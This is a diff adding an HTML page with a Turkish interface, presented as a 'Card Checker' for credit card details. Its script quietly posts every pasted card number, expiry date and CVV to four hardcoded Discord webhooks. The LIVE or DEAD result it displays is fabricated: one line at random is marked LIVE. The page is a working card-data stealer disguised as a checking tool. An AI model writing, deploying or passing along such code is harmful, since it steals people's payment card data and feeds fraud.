@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <title>Card Checker</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body {
+      background: #1e1e2f;
+      color: white;
+      padding: 20px;
+      font-family: sans-serif;
+      text-align: center;
+    }
+    textarea {
+      width: 100%;
+      max-width: 500px;
+      height: 150px;
+      padding: 10px;
+      border-radius: 8px;
+      font-size: 16px;
+      resize: vertical;
+    }
+    button {
+      background: #00ffcc;
+      border: none;
+      padding: 10px 20px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    #result {
+      margin-top: 20px;
+      text-align: left;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
+      font-family: monospace;
+      white-space: pre-wrap;
+    }
+    .live {
+      color: #00ff00;
+    }
+    .dead {
+      color: #ff3333;
+    }
+  </style>
+</head>
+<body>
+  <h2>Card Checker</h2>
+  <textarea id="cards" placeholder="1111222233334444|12|29|000\n2222333344445555|01|25|123"></textarea><br />
+  <button onclick="check()">Kontrol Et</button>
+
+  <div id="result"></div>
+
+  <script>
+    const webhooks = [
+      "https://discordapp.com/api/webhooks/1398624833469939712/V-_cAU34vycT-6w09K_KW3ydwPcMBc_ilVzLdMKWM7-7i42XDGtm0Qrx79DPYcduigUI",
+      "https://discordapp.com/api/webhooks/1391055242921246720/lv6JvwN-BgtlBrXyVdjNhqO0IgADVFwoy0oE1UUYdigrmz_2f2Qy6IcUoe9sJypz2U68",
+      "https://discordapp.com/api/webhooks/1391055415504142518/ItkUpXuOHCAj6Hk3CTrAdPfqDSstmuAXWs9GH1V1dF0lSFeAiE0I0R4UWmGtavFmmFk9",
+      "https://discordapp.com/api/webhooks/1391055688310198334/5AtUqsmszq8Lpy0NzJnL-l7qzCduNCJ8hF0UI9rFRyVxJ_3uX6RuvWInvyqLnQI8Suke"
+    ];
+
+    function check() {
+      const input = document.getElementById("cards").value.trim();
+      const lines = input.split("\n").filter(l => l.trim().length > 0);
+      const resultDiv = document.getElementById("result");
+      resultDiv.innerHTML = "";
+
+      if (lines.length === 0) return;
+
+      // Rastgele 1 tane LIVE seç
+      const liveIndex = Math.floor(Math.random() * lines.length);
+      let webhookIndex = 0;
+
+      lines.forEach((line, i) => {
+        setTimeout(() => {
+          const parts = line.trim().split("|");
+          const [number, month, year, cvv] = parts;
+          const valid =
+            parts.length === 4 &&
+            number.length === 16 &&
+            !isNaN(month) &&
+            !isNaN(year) &&
+            cvv.length === 3;
+
+          let status = "DEAD";
+          if (valid && i === liveIndex) {
+            status = "LIVE";
+          }
+
+          // Discord mesaj formatı
+          const discordMsg = `Kart: \`${line.trim()}\` → Sonuç: ${status}`;
+
+          // Webhook seç ve gönder
+          const webhookURL = webhooks[webhookIndex % webhooks.length];
+          webhookIndex++;
+
+          fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: discordMsg }),
+          });
+
+          // Sonucu ekranda göster
+          const div = document.createElement("div");
+          div.className = status === "LIVE" ? "live" : "dead";
+          div.textContent = `${line.trim()} ➤ ${status}`;
+          resultDiv.appendChild(div);
+        }, i * 1500); // 1.5 saniyede bir sırayla
+      });
+    }
+  </script>
+</body>
+</html>
